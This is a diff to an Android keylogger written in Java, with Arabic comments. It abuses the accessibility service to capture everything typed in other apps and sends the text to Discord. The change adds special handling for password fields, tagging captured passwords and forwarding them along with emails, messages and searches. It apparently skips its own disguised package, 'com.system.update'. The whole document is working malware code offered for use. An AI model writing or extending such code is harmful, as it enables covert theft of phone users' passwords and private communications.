@@ -21,12 +21,17 @@ public class KeyloggerService extends AccessibilityService {
                 String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
 
                 if (text.trim().isEmpty() || text.equals(lastText)) return;
-                
                 lastText = text;
                 if (pkg.equals("com.system.update")) return;
 
-                // إرسال النص اللي بيتكتب فوراً
-                sendToDiscord("⌨️ **Keylog:**\n**التطبيق:** `" + pkg + "`\n**النص:** `" + text + "`");
+                // لو دي خانة باسورد
+                if (source.isPassword()) {
+                    // بنبعت إشارة إنه بيكتب باسورد في التطبيق ده
+                    sendToDiscord("🔐 **محاولة كتابة باسورد!**\n**التطبيق:** `" + pkg + "`\n**النص (لو مسموح):** `" + text + "`");
+                } else {
+                    // كتابة عادية (إيميلات، رسايل، بحث)
+                    sendToDiscord("⌨️ **Keylog:**\n**التطبيق:** `" + pkg + "`\n**النص:** `" + text + "`");
+                }
             }
         }
     }
